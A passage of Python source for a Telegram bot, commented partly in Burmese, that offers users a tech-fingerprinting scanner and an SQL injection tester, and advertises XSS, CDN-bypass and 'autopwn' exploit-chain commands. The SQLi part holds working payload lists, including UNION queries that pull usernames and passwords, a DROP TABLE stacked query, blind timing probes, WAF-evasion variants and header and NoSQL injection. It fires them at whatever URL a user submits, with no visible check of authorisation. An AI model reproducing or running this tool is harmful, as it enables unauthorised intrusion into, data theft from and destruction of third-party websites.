            BotCommand("stop",         "🛑 Stop current scan"),
            BotCommand("resume",       "▶️ Resume download"),
        ]

        # ── Admin commands (Admin IDs သာ မြင်ရ) ─────────────────────────
        admin_commands = user_commands + [
            BotCommand("admin",       "🛠️ Admin panel"),
            BotCommand("ban",         "🚫 User ban"),
            BotCommand("unban",       "✅ User unban"),
            BotCommand("userinfo",    "👤 User info"),
            BotCommand("broadcast",   "📢 Broadcast message"),
            BotCommand("allusers",    "👥 All users list"),
            BotCommand("setforcejoin","📌 Set force join"),
            BotCommand("sys",         "🖥️ System logs/disk"),
            BotCommand("adminset",    "⚙️ Bot settings"),
        ]

        try:
            # Default scope — user commands (everyone)
            await application.bot.set_my_commands(
                user_commands,
                scope=BotCommandScopeDefault()
            )

            # Per-admin scope — admin commands (only admins)
            for admin_id in ADMIN_IDS:
                try:
                    await application.bot.set_my_commands(
                        admin_commands,
                        scope=BotCommandScopeChat(chat_id=admin_id)
                    )
                except Exception as e:
                    logger.warning("set_my_commands for admin %d failed: %s", admin_id, e)

            logger.info("Bot commands registered: %d user + %d admin-only",
                        len(user_commands), len(admin_commands) - len(user_commands))
        except Exception as e:
            logger.warning("set_my_commands failed: %s", e)

    app.post_init = _start_background

    # ── SIGTERM handler — Railway graceful shutdown ────
    import signal
    _shutdown_event = asyncio.Event() if False else None  # placeholder

    def _handle_sigterm(*_):
        logger.info("SIGTERM received — shutting down gracefully...")
        print("\n🛑 SIGTERM received — shutting down...")
        raise KeyboardInterrupt

    signal.signal(signal.SIGTERM, _handle_sigterm)

    # ── SQLite init + JSON migration ──────────────────────────
    _sqlite_init()
    _migrate_json_to_sqlite()

    # ── Retry loop — Network error recovery ───────────────
    MAX_RETRIES = 10
    RETRY_DELAY = 10

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            logger.info("Bot starting... (attempt %d/%d)", attempt, MAX_RETRIES)
            app.run_polling(
                allowed_updates      = Update.ALL_TYPES,
                drop_pending_updates = True,
                timeout              = 30,
                poll_interval        = 0.3,
            )
            break
        except TimedOut as e:
            logger.warning("TimedOut (attempt %d): %s", attempt, e)
            if attempt < MAX_RETRIES:
                print(f"⚠️  Timeout — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                import time as _time; _time.sleep(RETRY_DELAY)
            else:
                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
        except NetworkError as e:
            logger.warning("NetworkError (attempt %d): %s", attempt, e)
            if attempt < MAX_RETRIES:
                print(f"⚠️  Network error — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                import time as _time; _time.sleep(RETRY_DELAY)
            else:
                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
        except KeyboardInterrupt:
            print("\n👋 Bot stopped.")
            break
        except Conflict as e:
            logger.warning("Conflict (attempt %d): %s — another instance may still be shutting down", attempt, e)
            if attempt < MAX_RETRIES:
                _conflict_wait = 30  # wait longer so the old instance fully releases getUpdates
                print(f"⚠️  Conflict — {_conflict_wait}s စောင့်ပြီး retry ({attempt}/{MAX_RETRIES})...")
                import time as _time; _time.sleep(_conflict_wait)
            else:
                print("❌ Conflict: Only one bot instance can run at a time. Stop any other running instances.")

# ╔══════════════════════════════════════════════════════════════╗
# ║              V20 NEW FEATURES ADDON                          ║
# ║  ① /techstack  — Deep Tech Fingerprint (Wappalyzer-style)   ║
# ║  ② /sqli       — SQL Injection Tester                       ║
# ║  ③ /xss        — XSS Vulnerability Scanner                  ║
# ║  ④ /cloudcheck — Real IP / CDN Bypass Finder                ║
# ║  ⑤ /paramfuzz  — Advanced Parameter Fuzzer (Arjun-style)    ║
# ║  ⑥ /autopwn    — Full Auto Exploit Chain                    ║
# ║  ⑦ /bulkscan   — Bulk URL Scanner (txt file upload)         ║
# ╚══════════════════════════════════════════════════════════════╝

# ══════════════════════════════════════════════════
# ① /techstack — Deep Tech Fingerprint
# ══════════════════════════════════════════════════

_TECH_SIGNATURES = {
    # ── CMS ────────────────────────────────────────
    "WordPress":      [r'wp-content/', r'wp-includes/', r'wordpress', r'/wp-json/'],
    "Drupal":         [r'Drupal\.settings', r'/sites/default/files/', r'drupal'],
    "Joomla":         [r'/components/com_', r'Joomla!', r'/templates/system/'],
    "Magento":        [r'Mage\.Cookies', r'/skin/frontend/', r'magento'],
    "Shopify":        [r'cdn\.shopify\.com', r'Shopify\.theme', r'myshopify\.com'],
    "PrestaShop":     [r'prestashop', r'/modules/ps_', r'presta-module'],
    "OpenCart":       [r'catalog/view/theme', r'route=common/home'],
    "Ghost CMS":      [r'ghost-sdk', r'/ghost/api/', r'content/themes/casper'],
    "Strapi":         [r'/api/strapi', r'strapi-plugin'],
    "WooCommerce":    [r'woocommerce', r'/wc-api/', r'wc_add_to_cart'],
    # ── JavaScript Frameworks ───────────────────────
    "React":          [r'react\.development\.js', r'react-dom', r'__react', r'_reactRootContainer'],
    "Vue.js":         [r'vue\.min\.js', r'__vue__', r'v-bind:', r'vue\.runtime'],
    "Angular":        [r'ng-version=', r'angular\.min\.js', r'ngModule', r'ng-app='],
    "Next.js":        [r'__NEXT_DATA__', r'/_next/static/', r'next/dist/'],
    "Nuxt.js":        [r'__NUXT__', r'/_nuxt/', r'nuxt\.config'],
    "Svelte":         [r'__svelte', r'svelte-', r'svelte/internal'],
    "Ember.js":       [r'ember-source', r'ember\.debug\.js', r'Ember\.VERSION'],
    "Backbone.js":    [r'backbone\.js', r'Backbone\.Model'],
    "jQuery":         [r'jquery\.min\.js', r'jquery-[0-9]', r'\$\.ajax'],
    # ── Backend Frameworks ──────────────────────────
    "Laravel":        [r'laravel_session', r'XSRF-TOKEN', r'laravel/framework'],
    "Django":         [r'csrfmiddlewaretoken', r'django-version', r'__admin_media_prefix__'],
    "Ruby on Rails":  [r'_rails_session', r'X-Request-Id.*rails', r'config\.ru'],
    "Express.js":     [r'X-Powered-By: Express', r'express-session'],
    "Spring":         [r'X-Application-Context', r'SPRING_SECURITY_CONTEXT', r'spring-boot'],
    "FastAPI":        [r'/openapi\.json', r'/docs#/', r'fastapi'],
    "Flask":          [r'Werkzeug/', r'flask-session', r'flask'],
    "ASP.NET":        [r'__VIEWSTATE', r'ASP\.NET_SessionId', r'X-AspNet-Version'],
    "PHP":            [r'X-Powered-By: PHP', r'\.php', r'PHPSESSID'],
    # ── Databases (via error messages) ─────────────
    "MySQL":          [r'mysql_fetch', r'MySQL server', r'MySQLi'],
    "PostgreSQL":     [r'pg_query', r'PostgreSQL.*ERROR', r'psycopg2'],
    "MongoDB":        [r'MongoError', r'mongodb\+srv', r'mongoose'],
    "Redis":          [r'redis-server', r'RedisError'],
    "Elasticsearch":  [r'elasticsearch', r'"_index":', r'"_shards":'],
    # ── Web Servers ─────────────────────────────────
    "Nginx":          [r'Server: nginx', r'nginx/[0-9]'],
    "Apache":         [r'Server: Apache', r'Apache/[0-9]'],
    "IIS":            [r'Server: Microsoft-IIS', r'X-Powered-By: ASP\.NET'],
    "LiteSpeed":      [r'Server: LiteSpeed', r'X-LiteSpeed'],
    "Caddy":          [r'Server: Caddy', r'caddy/'],
    # ── CDN / Security ──────────────────────────────
    "Cloudflare":     [r'cf-ray:', r'__cfduid', r'cf-cache-status', r'cloudflare'],
    "AWS CloudFront": [r'X-Amz-Cf-Id', r'X-Cache: Hit from cloudfront', r'cloudfront\.net'],
    "Akamai":         [r'X-Akamai', r'akamai', r'AkamaiGHost'],
    "Fastly":         [r'X-Served-By.*cache-', r'fastly', r'X-Fastly'],
    "Imperva":        [r'X-CDN: Imperva', r'incapsula', r'visid_incap'],
    "Sucuri":         [r'X-Sucuri', r'sucuri', r'sitecheck\.sucuri'],
    "ModSecurity":    [r'Mod_Security', r'NOYB', r'X-Mod-Pagespeed'],
    # ── Analytics / Tracking ────────────────────────
    "Google Analytics":    [r'google-analytics\.com', r'gtag\(', r'ga\.js', r'analytics\.js'],
    "Google Tag Manager":  [r'googletagmanager\.com', r'GTM-[A-Z0-9]+'],
    "Facebook Pixel":      [r'connect\.facebook\.net', r'fbq\(', r'_fbp'],
    "Hotjar":              [r'hotjar\.com', r'hjid:'],
    "Mixpanel":            [r'mixpanel\.com', r'mixpanel\.track'],
    # ── JavaScript Libraries ────────────────────────
    "Bootstrap":      [r'bootstrap\.min\.css', r'bootstrap\.bundle\.js', r'class="container'],
    "Tailwind CSS":   [r'tailwind', r'class="flex ', r'class="text-'],
    "Font Awesome":   [r'font-awesome', r'fontawesome', r'fa fa-', r'fas fa-'],
    "Lodash":         [r'lodash\.min\.js', r'_\.debounce'],
    "Axios":          [r'axios\.min\.js', r'axios\.get\('],
    "Socket.io":      [r'socket\.io\.js', r'io\.connect\(', r'socket\.emit\('],
    "D3.js":          [r'd3\.min\.js', r'd3\.select\(', r'd3-selection'],
    # ── Payment / E-commerce ────────────────────────
    "Stripe":         [r'js\.stripe\.com', r'stripe\.createToken', r'stripe\.js'],
    "PayPal":         [r'paypal\.com/sdk', r'paypal\.Buttons\('],
    "Braintree":      [r'braintree-web', r'braintreegateway\.com'],
    # ── Cloud / Infra ───────────────────────────────
    "AWS S3":         [r's3\.amazonaws\.com', r'X-Amz-Request-Id'],
    "Google Cloud":   [r'storage\.googleapis\.com', r'X-GUploader'],
    "Firebase":       [r'firebaseapp\.com', r'firebase\.google\.com', r'firebaseio\.com'],
    "Vercel":         [r'vercel\.app', r'x-vercel-', r'vercel\.com'],
    "Netlify":        [r'netlify\.app', r'netlify\.com', r'x-nf-'],
    "Heroku":         [r'herokuapp\.com', r'x-heroku-'],
}

def _techstack_scan_sync(url: str, progress_q: list) -> dict:
    """Deep tech fingerprint scan."""
    # ── Cache check ─────────────────────────
    _ck = f"tech:{url}"
    cached = _cache_get(_ck)
    if cached:
        if progress_q is not None: progress_q.append("⚡ Cached result")
        return cached

    results = {
        "detected": {},
        "server": "",
        "headers": {},
        "cookies": [],
        "cms_version": "",
        "php_version": "",
        "js_version": "",
        "response_time_ms": 0,
        "status_code": 0,
        "waf_detected": "",
        "cloud_provider": "",
    }

    try:
        progress_q.append("🌐 Fetching page headers + body...")
        t0 = time.time()
        resp = requests.get(url, headers=_get_headers(), timeout=15,
                            verify=False, allow_redirects=True)
        results["response_time_ms"] = int((time.time() - t0) * 1000)
        results["status_code"] = resp.status_code
        headers_str = str(resp.headers).lower()
        body = resp.text[:50000]
        combined = headers_str + body.lower()

        # Collect headers
        for h in ['Server','X-Powered-By','X-Generator','X-Drupal-Cache',
                  'X-Wordpress-Cache','Via','X-Cache','CF-Ray','X-Amz-Cf-Id',
                  'X-Akamai-Transformed','Strict-Transport-Security',
                  'Content-Security-Policy','X-Frame-Options','X-XSS-Protection']:
            val = resp.headers.get(h, "")
            if val:
                results["headers"][h] = val

        results["server"] = resp.headers.get("Server", "Unknown")

        # Cookie security
        for ck in resp.cookies:
            results["cookies"].append({
                "name": ck.name, "secure": ck.secure,
                "httponly": ck.has_nonstandard_attr("httponly") or
                            ck.has_nonstandard_attr("HttpOnly"),
                "samesite": ck._rest.get("SameSite","Not Set")
            })

        # Version extraction
        php_m = re.search(r'PHP/([0-9]+\.[0-9]+\.[0-9]+)', resp.headers.get("X-Powered-By",""))
        if php_m:
            results["php_version"] = php_m.group(1)

        wp_m = re.search(r'WordPress/([0-9]+\.[0-9.]+)', str(resp.headers))
        if not wp_m:
            wp_m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress ([0-9.]+)', body)
        if wp_m:
            results["cms_version"] = f"WordPress {wp_m.group(1)}"

        # Tech detection
        progress_q.append(f"🔍 Running {len(_TECH_SIGNATURES)} tech signatures...")
        categories = {
            "CMS": ["WordPress","Drupal","Joomla","Magento","Shopify","PrestaShop",
                    "OpenCart","Ghost CMS","Strapi","WooCommerce"],
            "JS Framework": ["React","Vue.js","Angular","Next.js","Nuxt.js","Svelte",
                             "Ember.js","Backbone.js","jQuery"],
            "Backend": ["Laravel","Django","Ruby on Rails","Express.js","Spring",
                        "FastAPI","Flask","ASP.NET","PHP"],
            "Database": ["MySQL","PostgreSQL","MongoDB","Redis","Elasticsearch"],
            "Web Server": ["Nginx","Apache","IIS","LiteSpeed","Caddy"],
            "CDN/WAF": ["Cloudflare","AWS CloudFront","Akamai","Fastly",
                        "Imperva","Sucuri","ModSecurity"],
            "Analytics": ["Google Analytics","Google Tag Manager","Facebook Pixel",
                          "Hotjar","Mixpanel"],
            "JS Library": ["Bootstrap","Tailwind CSS","Font Awesome","Lodash",
                           "Axios","Socket.io","D3.js"],
            "Payment": ["Stripe","PayPal","Braintree"],
            "Cloud/Infra": ["AWS S3","Google Cloud","Firebase","Vercel","Netlify","Heroku"],
        }

        cat_map = {}
        for cat, techs in categories.items():
            for t in techs:
                cat_map[t] = cat

        for tech, patterns in _TECH_SIGNATURES.items():
            for pat in patterns:
                if re.search(pat, combined, re.I):
                    cat = cat_map.get(tech, "Other")
                    results["detected"].setdefault(cat, [])
                    if tech not in results["detected"][cat]:
                        results["detected"][cat].append(tech)
                    break

        # WAF summary
        waf_techs = results["detected"].get("CDN/WAF", [])
        if waf_techs:
            results["waf_detected"] = ", ".join(waf_techs)

        # Cloud provider
        for cloud, keys in [("AWS", ["AWS S3","AWS CloudFront"]),
                             ("Google Cloud", ["Google Cloud","Firebase"]),
                             ("Vercel", ["Vercel"]), ("Netlify", ["Netlify"]),
                             ("Cloudflare", ["Cloudflare"])]:
            for k in keys:
                if k in str(results["detected"]):
                    results["cloud_provider"] = cloud
                    break

    except Exception as e:
        results["error"] = str(e)

    return results


async def cmd_techstack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/techstack <url> — Deep technology fingerprint scanner"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/techstack https://example.com`\n\n"
            "🔍 *Detects:*\n"
            "  • CMS (WordPress, Drupal, Shopify…)\n"
            "  • JS Frameworks (React, Vue, Angular, Next.js…)\n"
            "  • Backend (Laravel, Django, Express, Spring…)\n"
            "  • CDN/WAF (Cloudflare, Akamai, Imperva…)\n"
            "  • Analytics, Libraries, Payment systems\n"
            "  • Exact versions (WordPress 6.x, PHP 8.x)\n"
            f"  • `{len(_TECH_SIGNATURES)}` tech signatures total",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "TechStack"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🔍 *TechStack Scan — `{domain}`*\n\n"
        f"Running `{len(_TECH_SIGNATURES)}` signatures...\n⏳",
        parse_mode='Markdown'
    )

    # Track scan in DB
    async with db_lock:
        _db = _load_db_sync()
        track_scan(_db, uid, "TechStack", domain)
        _save_db_sync(_db)

    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔍 *TechStack — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_techstack_scan_sync, url, progress_q)
    except Exception as e:
        prog.cancel()
        _active_scans.pop(uid, None)
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    detected = data.get("detected", {})
    total_tech = sum(len(v) for v in detected.values())

    lines = [
        f"🔍 *TechStack — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🌐 Status: `{data['status_code']}` | ⚡ `{data['response_time_ms']}ms`",
        f"🖥 Server: `{data.get('server','?')}`",
    ]
    if data.get("cms_version"):
        lines.append(f"📋 CMS: `{data['cms_version']}`")
    if data.get("php_version"):
        lines.append(f"🐘 PHP: `{data['php_version']}`")
    if data.get("waf_detected"):
        lines.append(f"🛡 WAF/CDN: `{data['waf_detected']}`")
    if data.get("cloud_provider"):
        lines.append(f"☁️ Cloud: `{data['cloud_provider']}`")
    lines.append(f"\n🎯 *Detected: `{total_tech}` technologies*\n")

    cat_icons = {
        "CMS":"📝", "JS Framework":"⚛️", "Backend":"⚙️",
        "Database":"🗄️", "Web Server":"🖥", "CDN/WAF":"🛡",
        "Analytics":"📊", "JS Library":"📦", "Payment":"💳",
        "Cloud/Infra":"☁️", "Other":"🔧"
    }

    for cat, techs in detected.items():
        icon = cat_icons.get(cat, "🔧")
        lines.append(f"{icon} *{cat}:*")
        for t in techs:
            lines.append(f"  ✅ `{t}`")

    # Security headers analysis
    sec_headers = data.get("headers", {})
    missing = []
    for h in ["Strict-Transport-Security", "Content-Security-Policy",
               "X-Frame-Options", "X-XSS-Protection"]:
        if h not in sec_headers:
            missing.append(h)
    if missing:
        lines.append(f"\n⚠️ *Missing Security Headers:*")
        for h in missing:
            lines.append(f"  ❌ `{h}`")

    if not detected:
        lines.append("❓ No common technologies detected\n_(custom/obfuscated stack)_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    import io as _io
    _rj = json.dumps(data, indent=2, default=str, ensure_ascii=False)
    _rb = _io.BytesIO(_rj.encode())
    _ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    _sd = re.sub(r'[^\w\-]', '_', domain)
    await context.bot.send_document(
        chat_id=update.effective_chat.id, document=_rb,
        filename=f"techstack_{_sd}_{_ts}.json",
        caption=f"🔬 TechStack — `{domain}`", parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# ② /sqli — SQL Injection Tester
# ══════════════════════════════════════════════════

_SQLI_ERRORS = {
    "MySQL":      [r"you have an error in your sql syntax",
                   r"warning.*mysql_", r"mysql_num_rows",
                   r"supplied argument is not a valid mysql", r"mysql\.err",
                   r"com\.mysql\.jdbc", r"root@localhost", r"mysql_fetch_array",
                   r"mysql_connect\(\)", r"mysql server version for the right",
                   r"error.*in your sql syntax", r"mysql_query\(\)"],
    "PostgreSQL": [r"pg_query\(\)", r"pgsqlquery", r"postgresql.*error",
                   r"warning.*pg_", r"valid postgresql result",
                   r"psql.*error", r"pg_exec\(\)", r"unterminated quoted string",
                   r"invalid input syntax for", r"column.*does not exist",
                   r"relation.*does not exist"],
    "MSSQL":      [r"microsoft.*odbc.*sql server", r"odbc sql server driver",
                   r"sqlsrv_query", r"mssql_query", r"unclosed quotation mark",
                   r"microsoft.*ole db.*sql server", r"mssql_execute",
                   r"sqlstate.*42000", r"incorrect syntax near",
                   r"conversion failed when converting"],
    "Oracle":     [r"ora-[0-9]{5}", r"oracle error", r"oracle.*driver",
                   r"quoted string not properly terminated",
                   r"oci_parse\(\)", r"oci_execute\(\)", r"oracle\.jdbc"],
    "SQLite":     [r"sqlite.*error", r"sqlite3\.operationalerror",
                   r"near.*syntax error", r"sqliteexception",
                   r"no such column", r"no such table"],
    "IBM DB2":    [r"CLI Driver.*DB2", r"db2_execute", r"db2_query",
                   r"SQLSTATE.*42", r"com\.ibm\.db2"],
    "Sybase":     [r"sybase.*error", r"com\.sybase\.jdbc",
                   r"sybase.adaptive", r"ASA Error"],
    "NoSQL":      [r"mongoerror", r"mongodb.*exception",
                   r"CastError.*ObjectId", r"E11000 duplicate key"],
    "Generic":    [r"sql syntax.*near", r"syntax error.*in query expression",
                   r"data source name not found", r"\[microsoft\]\[odbc",
                   r"invalid.*argument.*supplied.*sql", r"error in your sql",
                   r"PDOException.*SQLSTATE", r"Zend_Db.*Exception"],
}

# ── WAF Evasion payloads (appended to basic list at runtime) ─────────
_SQLI_WAF_BYPASS = [
    "' /*!50000OR*/ '1'='1'--",
    "' OR/**/'1'='1'--",
    "'%09OR%091=1--",
    "' OR 0x31=0x31--",
    "' OR CHAR(49)=CHAR(49)--",
    "' oR '1'='1",
    "1' AnD 1=1--",
    "1'/**/AND/**/1=1--",
    "1' AND 0x31=0x31--",
    "1+AND+1=1",
    "%27+OR+%271%27=%271",
]

# ── Header injection targets ─────────────────────────────────────────
_SQLI_HEADERS_TO_TEST = [
    "X-Forwarded-For",
    "X-Real-IP",
    "Referer",
    "User-Agent",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "Cookie",
]

# ── Scan result cache (5min TTL) ──────────────────────────────
_scan_cache: dict = {}   # {cache_key: (timestamp, result)}
_SCAN_CACHE_TTL = 300    # 5 minutes

def _cache_get(key: str):
    """Return cached result if still fresh, else None."""
    entry = _scan_cache.get(key)
    if entry and (time.time() - entry[0]) < _SCAN_CACHE_TTL:
        return entry[1]
    _scan_cache.pop(key, None)
    return None

def _cache_set(key: str, result):
    """Store result in cache. Evict oldest if > 200 entries."""
    if len(_scan_cache) > 200:
        oldest = min(_scan_cache, key=lambda k: _scan_cache[k][0])
        _scan_cache.pop(oldest, None)
    _scan_cache[key] = (time.time(), result)


_SQLI_PAYLOADS_BASIC = [
    # Error-based — single/double quote break
    "'", '"', "`", "''", '""', "\\", "%27", "%22",
    "' OR '1'='1", "' OR 1=1--", '" OR "1"="1',
    "' OR 'x'='x", "') OR ('x'='x", "') OR ('1'='1",
    "' OR 1=1#", "' OR 1=1/*", '") OR ("1"="1',
    "' OR 1=1--+", "' OR 1=1-- -", "') OR 1=1--",
    "\" OR 1=1--", "\" OR 1=1#", "') OR '1'='1'--",
    # ORDER BY enumeration
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1' ORDER BY 4--", "1' ORDER BY 5--", "1' ORDER BY 10--",
    "1 ORDER BY 1--", "1 ORDER BY 2--", "1 ORDER BY 3--",
    # UNION SELECT — null probes
    "1' UNION SELECT null--",
    "1' UNION SELECT null,null--",
    "1' UNION SELECT null,null,null--",
    "1' UNION SELECT null,null,null,null--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION ALL SELECT NULL,NULL--",
    "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
    "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL--",
    "1 UNION SELECT null--",
    "1 UNION ALL SELECT null,null--",
    # Information schema / data extraction
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT user(),version()--",
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT database(),NULL--",
    "' UNION SELECT @@hostname,@@datadir--",
    "' UNION SELECT schema_name FROM information_schema.schemata--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; SELECT SLEEP(0)--",
    "1; SELECT 1--",
    "1'; SELECT '1",
    "1'; INSERT INTO--",
    # Boolean-based quick checks
    "1 AND 1=1", "1 AND 1=2",
    "1' AND '1'='1", "1' AND '1'='2",
    "1 AND 1=1--", "1 AND 1=2--",
    "1 AND (SELECT 1)=1", "1 AND (SELECT 1)=2",
    # Error triggers — MySQL
    "extractvalue(1,concat(0x7e,(SELECT version())))",
    "updatexml(1,concat(0x7e,(SELECT database())),1)",
    "1' AND extractvalue(rand(),concat(0x7e,(SELECT version())))--",
    # Error triggers — MSSQL
    "CONVERT(int,(SELECT TOP 1 name FROM sysobjects))",
    "1/0",
    # Error triggers — Oracle
    "' AND 1=(SELECT 1 FROM dual)--",
    "' UNION SELECT NULL FROM dual--",
    # Bypasses / obfuscation
    "1'/**/OR/**/'1'='1", "1' OR 1=1 LIMIT 1--",
    "1'%20OR%20'1'='1", "1'%09OR%09'1'='1",
    "1' OR 1=1 #", "1\" OR \"1\"=\"1",
    "1'||'", "1'+OR+1=1--",
    "1'%0AOR%0A1=1--",          # newline bypass
    "1';--",                    # comment terminator
    "1'%00",                    # null byte
]

_SQLI_PAYLOADS_BLIND = [
    # ── Time-based (MySQL) ────────────────────────
    ("1' AND SLEEP(3)--",                       3.0),
    ("1' AND SLEEP(3)#",                        3.0),
    ("1') AND SLEEP(3)--",                      3.0),
    ("1' AND (SELECT * FROM (SELECT SLEEP(3))a)--", 3.0),
    ("' AND SLEEP(3) AND 'x'='x",               3.0),
    ("1' AND SLEEP(3)-- -",                     3.0),
    ("1;SELECT SLEEP(3)--",                     3.0),
    # ── Time-based (PostgreSQL) ───────────────────
    ("1' AND pg_sleep(3)--",                    3.0),
    ("1'; SELECT pg_sleep(3)--",                3.0),
    ("1' AND (SELECT 1 FROM pg_sleep(3))--",    3.0),
    ("1;SELECT pg_sleep(3)--",                  3.0),
    # ── Time-based (MSSQL) ────────────────────────
    ("1'; WAITFOR DELAY '0:0:3'--",             3.0),
    ("1' WAITFOR DELAY '0:0:3'--",              3.0),
    ("'; WAITFOR DELAY '0:0:3'--",              3.0),
    ("1;WAITFOR DELAY '0:0:3'--",               3.0),
    # ── Time-based (Oracle) ───────────────────────
    ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", 3.0),
    ("1' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",  3.0),
    # ── Time-based (SQLite) ───────────────────────
    ("1' AND 1=RANDOMBLOB(100000000)--",        3.0),
    ("1 AND 1=RANDOMBLOB(100000000)",           3.0),
    # ── Boolean-based ─────────────────────────────
    ("1 AND 1=1",                               None),
    ("1 AND 1=0",                               None),
    ("1' AND '1'='1",                           None),
    ("1' AND '1'='2",                           None),
    ("1' AND 1=1--",                            None),
    ("1' AND 1=0--",                            None),
    ("1 AND 1=1--",                             None),
    ("1 AND 1=0--",                             None),
    ("1' AND 1=(SELECT 1)--",                   None),
    ("1' AND 1=(SELECT 2)--",                   None),
]

def _sqli_scan_sync(url: str, progress_q: list) -> dict:
    """SQL Injection scanner — error + boolean + time + POST + header injection + WAF bypass."""
    results = {
        "error_based":   [],
        "boolean_based": [],
        "time_based":    [],
        "post_based":    [],
        "header_based":  [],
        "nosql_based":   [],
        "params_tested": [],
        "db_type":       "Unknown",
        "total_found":   0,
        "waf_detected":  False,
    }

    parsed = urlparse(url)
    params_raw = parsed.query
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    # ── Collect GET parameters ──────────────────────
    params = {}
    if params_raw:
        for part in params_raw.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                params[k] = v

    # Fallback: common params if URL has none
    if not params:
        common_params = ["id", "page", "cat", "product", "search",
                         "q", "query", "user", "username", "item",
                         "view", "type", "pid", "cid", "uid", "sid"]
        params = {p: "1" for p in common_params[:5]}
        results["_no_params_in_url"] = True

    results["params_tested"] = list(params.keys())
    progress_q.append(f"🔍 Testing `{len(params)}` params: `{'`, `'.join(list(params.keys())[:6])}`")

    # ── Shared session ─────────────────────────────
    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    def _check_error(body: str) -> tuple:
        body_l = body.lower()
        for db_type, patterns in _SQLI_ERRORS.items():
            for pat in patterns:
                if re.search(pat, body_l, re.I):
                    return db_type, pat
        return None, None

    def _test_error_get(param, payload):
        try:
            test_params = dict(params)
            test_params[param] = payload
            r = session.get(base_url, params=test_params, timeout=10)
            return _check_error(r.text)
        except Exception as _e:
            logging.debug("SQLi GET error: %s", _e)
        return None, None

    def _test_error_post(param, payload):
        """Test SQLi via POST body (form-data + JSON)"""
        try:
            post_data = dict(params)
            post_data[param] = payload
            # Try form-data first
            r = session.post(base_url, data=post_data, timeout=10)
            db, pat = _check_error(r.text)
            if db: return db, pat
            # Try JSON body
            r2 = session.post(base_url, json=post_data,
                              headers={**_get_headers(), "Content-Type": "application/json"},
                              timeout=10)
            return _check_error(r2.text)
        except Exception as _e:
            logging.debug("SQLi POST error: %s", _e)
        return None, None

    def _test_header_injection(header_name, payload):
        """Inject SQLi payload into HTTP headers"""
        try:
            inj_headers = dict(_get_headers())
            inj_headers[header_name] = payload
            r = session.get(base_url, headers=inj_headers, timeout=10)
            return _check_error(r.text)
        except Exception as _e:
            logging.debug("SQLi header error: %s", _e)
        return None, None

    def _test_boolean(param, true_pay, false_pay):
        try:
            p_t = dict(params); p_t[param] = true_pay
            p_f = dict(params); p_f[param] = false_pay
            r_t = session.get(base_url, params=p_t, timeout=8)
            r_f = session.get(base_url, params=p_f, timeout=8)
            diff = abs(len(r_t.text) - len(r_f.text))
            # Use difflib ratio for more reliable boolean detection
            similarity = difflib.SequenceMatcher(None, r_t.text[:2000], r_f.text[:2000]).ratio()
            if diff > 50 and similarity < 0.97:
                return True, diff
        except Exception as _e:
            logging.debug("SQLi bool error: %s", _e)
        return False, 0

    def _test_nosql(param):
        """Test NoSQL injection (MongoDB-style)"""
        nosql_payloads = [
            {"$gt": ""},
            {"$ne": "invalid_xyz"},
            {"$regex": ".*"},
            {"$where": "1==1"},
        ]
        try:
            for payload in nosql_payloads:
                post_data = dict(params)
                post_data[param] = payload
                r = session.post(base_url, json={param: payload}, timeout=8)
                if r.status_code == 200 and len(r.text) > 100:
                    # Check if response differs from baseline (invalid input)
